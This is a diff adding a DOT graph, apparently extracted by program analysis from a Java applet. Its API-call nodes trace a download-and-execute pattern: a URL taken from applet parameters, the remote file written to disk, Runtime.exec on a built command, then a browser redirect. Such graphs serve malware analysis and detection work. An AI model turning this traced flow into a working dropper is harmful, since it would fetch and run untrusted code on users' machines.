@@ -1,0 +1,37 @@
+digraph "" {
+"virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>";
+ "virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>"->"staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>";
+ "staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>"->"virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>";
+ "virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>"->"new java.io.FileOutputStream";
+ "new java.io.FileOutputStream"->"new java.lang.StringBuilder";
+ "new java.lang.StringBuilder"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+ "specialinvoke <java.lang.StringBuilder: void <init>()>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+ "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+ "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+ "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>";
+ "specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>"->"new java.net.URL";
+ "new java.net.URL"->"virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>";
+ "virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+ "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>";
+ "virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>"->"virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>";
+ "virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>"->"virtualinvoke <java.io.InputStream: int read(byte[],int,int)>";
+ "virtualinvoke <java.io.InputStream: int read(byte[],int,int)>"->"virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>";
+ "virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>"->"goto load.r r6";
+ "virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>"->"staticinvoke <java.lang.System: void exit(int)>";
+ "staticinvoke <java.lang.System: void exit(int)>"->"return";
+"virtualinvoke <java.io.InputStream: void close()>";
+ "virtualinvoke <java.io.InputStream: void close()>"->"virtualinvoke <java.io.FileOutputStream: void close()>";
+ "virtualinvoke <java.io.FileOutputStream: void close()>"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+ "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"new java.lang.StringBuilder";
+ "new java.lang.StringBuilder"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+ "specialinvoke <java.lang.StringBuilder: void <init>()>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+ "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+ "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+ "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+ "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"new java.net.URL";
+ "new java.net.URL"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+ "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"virtualinvoke <Java: java.applet.AppletContext getAppletContext()>";
+ "virtualinvoke <Java: java.applet.AppletContext getAppletContext()>"->"interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1";
+ "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1"->"staticinvoke <java.lang.System: void exit(int)>";
+ "staticinvoke <java.lang.System: void exit(int)>"->"goto return";
+}
